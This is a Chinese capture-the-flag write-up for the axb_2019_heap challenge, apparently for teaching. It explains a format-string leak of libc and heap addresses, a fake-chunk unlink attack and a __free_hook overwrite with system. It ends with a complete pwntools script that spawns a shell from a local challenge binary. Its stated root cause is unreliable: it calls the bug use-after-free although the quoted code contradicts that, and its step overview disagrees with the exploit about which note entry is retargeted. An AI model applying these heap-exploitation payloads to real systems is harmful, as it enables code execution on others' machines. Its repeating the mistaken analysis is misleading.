# 漏洞成因
## 程序关键结构体
程序使用一个全局数组 `note` 来管理堆块，其结构可以抽象如下：
```c
struct note_entry {
    void* ptr;    // 指向堆块的指针
    int size;     // 记录分配的大小
} note[11];
```
在反编译代码中，该数组以 `*((_QWORD *)&note + 2 * idx)` 的形式访问指针，以 `*((_DWORD *)&note + 4 * idx + 2)` 的形式访问大小。

## 漏洞定位
程序在 `delete_note` 函数中释放堆块后，虽然将对应的 `ptr` 指针置为 `NULL`，但并未从任何全局列表中移除该索引，`counts` 仅用于限制总数。这意味着，如果通过 `edit_note` 编辑一个已经被释放（`ptr`已为NULL）的索引，程序会直接通过 `get_input` 向一个已释放的堆块写入数据，造成了典型的 **Use-After-Free (UAF)** 漏洞。

```c
// delete_note 函数片段
if ( v1 <= 0xA && *((_QWORD *)&note + 2 * (int)v1) ) {
    free(*((void **)&note + 2 * (int)v1));
    *((_QWORD *)&note + 2 * (int)v1) = 0; // 指针被清空
    *((_DWORD *)&note + 4 * (int)v1 + 2) = 0;
    --counts;
    puts("Done!");
}
// edit_note 函数片段
if ( v1 <= 0xA && *((_QWORD *)&note + 2 * (int)v1) ) { // 检查指针非空
    puts("Enter the content: ");
    // 如果指针在别处被修改为非NULL，即使对应堆块已free，仍能通过检查并写入
    get_input(*((_QWORD *)&note + 2 * (int)v1), *((_DWORD *)&note + 4 * (int)v1 + 2));
```

# 漏洞利用过程：
本利用的核心是通过格式化字符串漏洞泄露libc与堆地址，然后利用UAF和堆上的unlink攻击，修改全局`note`数组中的指针，最终劫持`__free_hook`为`system`，并在释放内容为`/bin/sh`的块时获得shell。
- Step 1: 利用`banner`函数中的格式化字符串漏洞，泄露libc基地址。
- Step 2: 继续泄露堆上指针，计算出全局`note`数组的地址。
- Step 3: 进行堆布局，分配两个相邻的堆块（chunk 0 和 chunk 1）。
- Step 4: 利用UAF，通过`edit`功能在已释放的chunk 0中伪造一个堆块（fake chunk），并将其`fd`和`bk`指针设置为指向`note`数组自身，为unlink攻击做准备。
- Step 5: 释放chunk 1，触发unlink攻击。unlink操作会修改`note[0]`的指针，使其指向`note`数组自身之前的位置。
- Step 6: 利用指向`note`数组自身的指针，通过`edit`功能修改`note`数组中的其他条目。将`note[1]`的指针覆盖为`__free_hook`的地址，同时将`note[1]`的大小和`note[2]`的指针也一并设置好，其中`note[2]`指向一个内容为`/bin/sh`的字符串。
- Step 7: 再次`edit`索引1，此时目标地址是`__free_hook`，向其写入`system`函数的地址。
- Step 8: 释放索引1（其内容为`/bin/sh`），此时实际执行的是`system("/bin/sh")`，从而获取shell。

## Step 1 & 2
- 在`banner`函数中，程序使用`printf(format)`直接打印用户输入，存在格式化字符串漏洞。利用`%15$p`和`%19$p`泄露栈上的两个地址。
    - 第一个泄露的地址是`__libc_start_main+240`，减去偏移后得到libc基址`base`，进而计算出`system`和`__free_hook`的地址。
    - 第二个泄露的地址位于堆栈上，通过计算 (`leak1 - 0x116a + 0x202060`) 得到全局变量`note`数组的地址`ptr`。

## Step 3
- 调用`add(0, 0x98, ‘a’*8)`。分配一个大小为0x98的堆块，实际获得一个0xa0大小的chunk（包含元数据）。用户区域从`addr0`开始。
- 调用`add(1, 0x90, ‘b’*8)`。分配一个大小为0x90的堆块，实际获得一个0xa0大小的chunk（包含元数据）。用户区域从`addr1`开始，与chunk 0相邻。
- **内存变化**：在堆区`addr0`和`addr1`处创建了两个新的堆块。

## Step 4
- 调用`edit(0, payload)`，向chunk 0的用户区域写入伪造的堆块数据。
- `payload`结构解析：
    - `p64(0) + p64(0x91)`：伪造的chunk头（prev_size和size）。`size`设为0x91，表示下一个“空闲”块的大小。
    - `p64(ptr - 0x18) + p64(ptr - 0x10)`：伪造的`fd`和`bk`指针，均指向`note[0]`指针所在位置附近，这是unlink攻击的关键。
    - `p64(0)*14`：填充。
    - `p64(0x90) + b”\xa0”`：覆盖到相邻chunk 1的`prev_size`（设为0x90）和`size`的最低字节（将`0xa1`改为`0xa0`），清除`PREV_INUSE`标志，欺骗glibc认为前一个块（我们的fake chunk）是空闲的。
- **内存变化**：堆地址`addr0`处的内容被覆盖为构造的payload。特别是`addr1 - 0x10`（chunk 1的size字段）的最低字节从`0xa1`变为`0xa0`。

## Step 5
- 调用`delete(1)`释放chunk 1。
- 由于chunk 1的`PREV_INUSE`位被清除，glibc会尝试向前合并，找到我们设置在chunk 0中的fake free chunk。
- glibc执行unlink操作，将fake chunk从其（伪造的）双向链表中摘下。unlink的宏定义如下：
    ```c
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK; // 即 *(FD + 0x18) = BK
    BK->fd = FD; // 即 *(BK + 0x10) = FD
    ```
- 其中`P`是我们的fake chunk，`FD = ptr - 0x18`， `BK = ptr - 0x10`。因此：
    - `*(ptr - 0x18 + 0x18) = *(ptr) = ptr - 0x10`
    - `*(ptr - 0x10 + 0x10) = *(ptr) = ptr - 0x18`
- **内存变化**：全局变量`note[0]`（地址为`ptr`）处的内容被修改为`ptr - 0x18`。这意味着`note[0].ptr`现在指向`note`数组内部（`&note[0] - 0x18`）。

## Step 6
- 调用`edit(0, payload)`。由于`note[0].ptr`现在指向`note`数组内部（`ptr - 0x18`），这次编辑操作将直接修改`note`数组的内容。
- `payload`结构解析 (`p64(0)*3 + p64(free_hook) + p64(0x48) + p64(ptr + 0x18) + b’/bin/sh\x00’`)：
    - `p64(0)*3`：填充`ptr-0x18`到`ptr`之间的空间。
    - 从`ptr`（即`note[0].ptr`）开始覆盖：
        - `p64(free_hook)`：将`note[0].ptr`改为`__free_hook`的地址。
        - `p64(0x48)`：将`note[0].size`改为一个任意值（0x48）。
    - 继续覆盖`note[1]`：
        - `p64(ptr + 0x18)`：将`note[1].ptr`改为`ptr + 0x18`（即`/bin/sh`字符串的存储地址）。
        - (由于结构体排列，`note[1].size`可能被`/bin/sh`字符串覆盖，但不影响利用)
    - `b’/bin/sh\x00’`：在`ptr+0x18`处写入字符串`/bin/sh`。
- **内存变化**：
    - `note[0].ptr` 从 `ptr - 0x18` 被修改为 `free_hook`。
    - `note[1].ptr` 从原来的堆地址被修改为 `ptr + 0x18`（指向全局区中的`/bin/sh`字符串）。

## Step 7
- 调用`edit(0, p64(sys))`。此时`note[0].ptr`是`__free_hook`的地址，因此这次编辑向`__free_hook`写入`system`函数的地址。
- **内存变化**：libc中的`__free_hook`函数指针被修改为`system`的地址。

## Step 8
- 调用`delete(1)`。此时`note[1].ptr`指向全局区的`/bin/sh`字符串。
- `free(note[1].ptr)`被调用，但由于`__free_hook`已被劫持，实际执行的是`system(“/bin/sh”)`。
- **结果**：成功启动shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/bin/heap23_12_axb_2019_heap')
elf = ELF('./data/bin/heap23_12_axb_2019_heap')
libc = elf.libc

def add(idx, size, content):
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'(0-10):')
    p.sendline(str(idx))
    p.recvuntil(b'Enter a size:\n')
    p.sendline(str(size))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def edit(idx, content):
    p.sendlineafter(b'>> ', b'4')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx).encode())

# Step 1: 格式化字符串泄露libc地址
p.recvuntil(b'Enter your name: ')
# %15$p 泄露 __libc_start_main+240
# %19$p 泄露栈上地址，用于计算note数组地址
p.sendline(b'%15$p%19$p')
p.recvuntil(b'Hello, ')
leak = int(p.recv(14), 16) - 240
base = leak - libc.symbols["__libc_start_main"]
libc.address = base
sys = libc.symbols["system"]
free_hook = libc.symbols["__free_hook"]

# Step 2: 计算note全局数组地址
leak1 = int(p.recv(15), 16)
ptr = leak1 - 0x116a + 0x202060 # 通过调试确定的偏移量

# Step 3: 堆布局，分配两个相邻块
add(0, 0x98, 'a'*8) # chunk 0, size 0xa0
add(1, 0x90, 'b'*8) # chunk 1, size 0xa0, 与chunk 0相邻

# Step 4: 在chunk 0中构造fake chunk，设置fd/bk指向note数组，并修改chunk 1的size标志位
payload = p64(0) + p64(0x91) # fake chunk header
payload += p64(ptr - 0x18) + p64(ptr - 0x10) # fd, bk for unlink
payload += p64(0)*14 # padding
payload += p64(0x90) + b"\xa0" # 修改chunk 1的prev_size和size(清除PREV_INUSE)
edit(0, payload)

# Step 5: 释放chunk 1，触发unlink，使得note[0].ptr指向note数组自身-0x18
delete(1)

# Step 6: 利用指向note数组自身的指针，修改note数组内容
# 将note[0].ptr改为free_hook，note[1].ptr改为/bin_sh字符串地址
payload = p64(0)*3 # 填充ptr-0x18到ptr的空间
payload += p64(free_hook) + p64(0x48) # 修改note[0].ptr和note[0].size
payload += p64(ptr + 0x18) + b'/bin/sh\x00' # 修改note[1].ptr 并写入/bin/sh字符串
edit(0, payload)

# Step 7: 通过note[0]编辑，向__free_hook写入system地址
payload = p64(sys)
edit(0, payload)

# Step 8: 释放note[1]（其指针指向/bin/sh），触发system("/bin/sh")
delete(1)

# Step 9: 交互
p.interactive()
```
